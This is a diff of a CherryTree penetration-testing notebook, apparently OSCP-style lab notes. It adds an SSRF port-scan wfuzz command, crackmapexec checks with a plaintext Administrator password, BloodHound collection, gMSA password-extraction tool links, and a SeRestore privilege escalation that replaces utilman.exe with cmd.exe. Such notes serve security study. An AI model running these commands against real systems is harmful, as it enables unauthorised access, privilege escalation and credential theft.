@@ -189,12 +189,17 @@ More on SQL injections:
             <rich_text>
 </rich_text>
           </node>
-          <node name="SSRF" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496888" ts_lastsave="1692773206">
-            <rich_text>- if Windows, we can capture the Kerberos Ticket using Responder and SSRF
+          <node name="SSRF" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496888" ts_lastsave="1693134424">
+            <rich_text>- if Windows, we can capture the Kerberos Ticket using Responder and SSRF (make sure to use </rich_text>
+            <rich_text weight="heavy">without </rich_text>
+            <rich_text style="italic" weight="heavy">-b</rich_text>
+            <rich_text weight="heavy"> option</rich_text>
+            <rich_text> also)
 - we can check for firwalls by checkinf if we get a request on more stranger ports (open a HTTP server on our machine on 4444 and try to get a request)
 - try requesting localhost =&gt; if we get a specific agent, maybe we will find an exploit for it
 
 For internal port scanning using SSRF, we can use WFUZZ.
+
 
 More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
@@ -204,6 +209,7 @@ It is also used to get inner services =&gt; we can request </rich_text>
             <rich_text link="webs http://127.0.0.1:21">http://127.0.0.1:21</rich_text>
             <rich_text> and if the connection is refused, then the box does not have FTP running internal (just an example). Check this: </rich_text>
             <rich_text link="webs https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation">https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation</rich_text>
+            <codebox char_offset="421" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wfuzz -c -z range,1-65535 --hl=2 http://{IP}:8080/?url.php?path=127.0.0.1:FUZZ</codebox>
           </node>
           <node name="LFI &amp; RFI" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830874" ts_lastsave="1690927726">
             <rich_text>- we can try to include shells from our server
@@ -443,7 +449,7 @@ Also check this out: </rich_text>
           <codebox char_offset="175" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
         </node>
       </node>
-      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1692172684">
+      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1692951137">
         <rich_text weight="heavy">Things to consider</rich_text>
         <rich_text>
 - Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
@@ -456,7 +462,11 @@ Also check this out: </rich_text>
         <rich_text>?
 - Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
 - Do the version numbers tell you anything about the host?
-- Have you tried bruteforce (cewl, patator)?
+- Have you tried bruteforce (</rich_text>
+        <rich_text weight="heavy">cewl</rich_text>
+        <rich_text> - use it on the main page, </rich_text>
+        <rich_text weight="heavy">patator</rich_text>
+        <rich_text>)?
 - Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
 - Try usernames found with </rich_text>
         <rich_text weight="heavy">capital letter</rich_text>
@@ -645,7 +655,7 @@ chmod +x /tmp/{binary}
 # Also check for .dockerenv file in root directory /.dockerenv =&gt; we are in a container</codebox>
         </node>
       </node>
-      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1691959060">
+      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1693136040">
         <rich_text>Use (and read CAREFULLY the output):
 - winpeas
 - PowerUp
@@ -737,6 +747,13 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <codebox char_offset="887" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">i686-w64-mingw32-gcc   - Win x32
 x86_64-w64-mingw32-gcc - Win x64</codebox>
         <codebox char_offset="1145" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">shutdown /r</codebox>
+        <node name="Important" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693136040" ts_lastsave="1693136108">
+          <rich_text>When we cannot read the winpeas output on kali machine, we have to use:
+</rich_text>
+          <codebox char_offset="72" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dos2unix -f outputwinpeas.txt # will convert to readable file on *NIX systems
+# Then
+less -r outputwinpeas.txt</codebox>
+        </node>
       </node>
       <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1692172545">
         <rich_text>- Recheck every line of output from Winpeas/Linpeas
@@ -793,9 +810,16 @@ x86_64-w64-mingw32-gcc - Win x64</codebox>
         <rich_text weight="heavy">his is exactly why we need to have multiple tools to accomplish a single task. When one fails, we can try another.</rich_text>
       </node>
     </node>
-    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1690137934">
+    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1693140125">
       <rich_text>Check this cheatsheet: </rich_text>
       <rich_text link="webs https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md">https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md</rich_text>
+      <rich_text>
+
+Make sure to use </rich_text>
+      <rich_text weight="heavy">PowerView</rich_text>
+      <rich_text>. Here is a cheatsheet: </rich_text>
+      <rich_text link="webs https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet">https://zflemingg1.gitbook.io/undergrad-tutorials/powerview/powerview-cheatsheet</rich_text>
+      <rich_text>.</rich_text>
       <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1690126271">
         <rich_text>We will use </rich_text>
         <rich_text weight="heavy">mimikatz</rich_text>
@@ -871,7 +895,7 @@ lsadump::sam</codebox>
           <rich_text link="webs https://github.com/crazywifi/Enable-RDP-One-Liner-CMD">https://github.com/crazywifi/Enable-RDP-One-Liner-CMD</rich_text>
         </node>
       </node>
-      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1691958968">
+      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1693137133">
         <rich_text>Try credentials using crackmapexec:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -914,7 +938,7 @@ Try moving lateraly with:
         <codebox char_offset="36" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator # this will check domain users credentials
 proxychains crackmapexec smb 10.10.114.154 -p hghgib6vHT3bVWf -u Administrator --local-auth # this will check local users credentials
 </codebox>
-        <codebox char_offset="578" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python -d {domain name} -ns {dc-ip} -c All -u {user} -p {password}</codebox>
+        <codebox char_offset="578" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python -d {domain name} -ns {dc-ip} -c All -u {user} -p {password} --zip</codebox>
       </node>
       <node name="File Transfer" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1690116035" ts_lastsave="1690116187">
         <rich_text>We can transfer files from the machine by port forwarding SCP port 6000 to 22 kali (from the Pivot Machine):
@@ -946,6 +970,36 @@ echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual trans
         <rich_text weight="heavy">watch out for account lockouts</rich_text>
         <rich_text>)
 - Check for password reusal</rich_text>
+      </node>
+      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142415">
+        <rich_text>If we find that we have </rich_text>
+        <rich_text weight="heavy">PrincipalsAllowedToRetrieveManagedPassword</rich_text>
+        <rich_text> (we have an allowed group) permissions to extract passwords, use: </rich_text>
+        <rich_text link="webs https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe">https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe</rich_text>
+        <rich_text>.
+
+If we have </rich_text>
+        <rich_text weight="heavy">SeRestore</rich_text>
+        <rich_text> permissions, follow this:
+1. Now we will be able to access anything from </rich_text>
+        <rich_text weight="heavy">C:\Windows\System32</rich_text>
+        <rich_text>.
+2. Now, we will replace utilman with CMD:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+3. </rich_text>
+        <rich_text weight="heavy">Utilman.exe</rich_text>
+        <rich_text> is triggered in </rich_text>
+        <rich_text weight="heavy">RDP</rich_text>
+        <rich_text> by using </rich_text>
+        <rich_text weight="heavy">WIN+U</rich_text>
+        <rich_text> in RDP.
+
+Or try this: </rich_text>
+        <rich_text link="webs https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</rich_text>
+        <codebox char_offset="366" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</codebox>
       </node>
     </node>
   </node>
